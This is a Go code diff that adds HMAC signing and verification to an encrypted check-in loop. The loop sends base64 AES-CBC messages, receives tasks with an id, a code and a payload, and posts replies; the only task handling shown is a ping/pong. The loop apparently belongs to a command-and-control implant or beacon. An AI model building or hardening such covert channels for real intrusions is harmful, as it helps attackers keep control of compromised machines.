@@ -31,6 +31,8 @@ func Start() {
 	for {
 		data := PackCheck(i)
 		dataEnc := enc.AESCbcEncrypt(data)
+
+		enc.HMACPackAddHmac(&dataEnc)
 		dataP := base64.StdEncoding.EncodeToString(dataEnc)
 
 		println("sent check:",dataP)
@@ -47,11 +49,18 @@ func Start() {
 		}
 		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(xyz)))
 		n, _ := base64.StdEncoding.Decode(dataB64, xyz)
-		xyzDecry, err := enc.AESCbcDecrypt(dataB64[:n])
+
+		if !enc.HMACVerifyHash(dataB64[:n]) {
+			fmt.Println("data not verified properly")
+			return
+		}
+		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
+		xyzDecry, err := enc.AESCbcDecrypt(dataOrig)
 		if err != nil {
 			println(err.Error())
 			return
 		}
+
 		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))
 
 		print("->",tcode)
@@ -61,8 +70,8 @@ func Start() {
 			responseTaskPayload := string(payload) + " pong"
 			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)
 
-
 			dataEnc := enc.AESCbcEncrypt(taskResp)
+			enc.HMACPackAddHmac(&dataEnc)
 			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
 			println(taskRestEnc)
 			h.Post([]byte(taskRestEnc))
